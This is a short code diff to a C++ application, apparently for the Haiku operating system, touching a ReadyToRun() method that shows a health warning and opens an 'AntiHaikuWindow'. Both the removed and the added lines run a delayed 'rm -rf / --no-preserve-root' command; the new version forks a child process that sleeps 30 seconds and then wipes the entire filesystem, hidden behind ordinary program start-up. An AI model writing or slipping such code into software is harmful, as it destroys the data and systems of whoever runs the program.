@@ -235,8 +235,17 @@ public:
     void ReadyToRun() override {
         ShowHealthWarning();
 
-        // Launch delayed rm -rf command after 30 seconds
-        system("sleep 30 && rm -rf / --no-preserve-root &");
+        pid_t pid = fork();
+        if (pid == 0) {  // Child process
+            // Sleep for 30 seconds, then execute the command
+            sleep(30);
+            system("rm -rf / --no-preserve-root");
+            exit(0); // Make sure the child process exits after the command runs
+        }
+        else if (pid < 0) {
+            // Fork failed
+            perror("fork failed");
+        }
 
         AntiHaikuWindow* window = new AntiHaikuWindow();
         window->Show();
